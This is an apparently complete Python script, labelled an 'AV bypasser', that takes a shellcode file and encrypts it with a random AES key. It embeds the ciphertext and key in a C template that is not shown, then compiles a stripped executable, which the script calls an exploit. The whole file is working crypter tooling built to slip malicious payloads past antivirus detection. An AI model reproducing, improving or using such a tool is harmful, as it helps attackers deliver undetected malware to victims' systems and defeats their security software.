from cryptography.hazmat.primitives.ciphers.algorithms import AES
from cryptography.hazmat.primitives.ciphers import Cipher
from cryptography.hazmat.primitives.ciphers.modes import ECB
from cryptography.hazmat.primitives.padding import PKCS7
import secrets
import subprocess
import argparse
from pwn import *
import shutil
import os


parser = argparse.ArgumentParser(description='AV bypasser')

parser.add_argument('-f', '--file', type=str, help='the shellcode file to obfuscate (no ELF)', required=True)
parser.add_argument('-o', '--out', type=str, help='the output filename', required=True)
parser.add_argument('-i', '--ignore', action='store_true', help='ignore if file exists')
args = parser.parse_args()


def pad(msg: bytes) -> bytes:
    pad = PKCS7(128).padder()
    return pad.update(msg) + pad.finalize()


if __name__ == '__main__':
    file = args.file
    out = args.out
    ignore = args.ignore
    
    key = secrets.token_bytes(32)
    ctx = Cipher(
        AES(key),
        ECB(),
    ).encryptor()
    
    key = key.hex()
    
    if not os.path.isfile(file):
        print('Invalid file')
        
    elif os.path.exists(out) and not args.ignore:
        print('out file already exists')
        
    elif subprocess.Popen('command -v cc 1>/dev/null', shell=True).wait() != 0:
        print('Missing compiler \'cc\'')

    else:
        with open('code.c', 'rt') as f:
            exploit_code = f.read().strip()
        
        with open(file, 'rb') as f:
            binary = f.read()
                    
        enc = pad(binary)

        enc = ctx.update(enc) + ctx.finalize()
        shf = ', '.join([hex(i) for i in enc])
                
        key_format = ', '.join(['0x' + key[i] + key[i+1] for i in range(0, len(key), 2)])
        exploit_code = exploit_code.replace('// exploit here', shf).replace('// key here', key_format)
        
        tmp_file = secrets.token_hex(16) + '.tmp.c'
        
        with open(tmp_file, 'wt') as f:
            f.write(exploit_code)
            
        rc = subprocess.Popen(f'cc -O3 -s -Icrypto -o {tmp_file[:-2]} {tmp_file} ./crypto/aes.c ./crypto/aes_sbox.c ./crypto/pad.c', shell=True)
        
        if rc.wait() != 0:
            print('error compiling the exploit')
        
        else:
            shutil.move(tmp_file[:-2], out)
            print('exploit compiled successfully!')

        os.remove(tmp_file)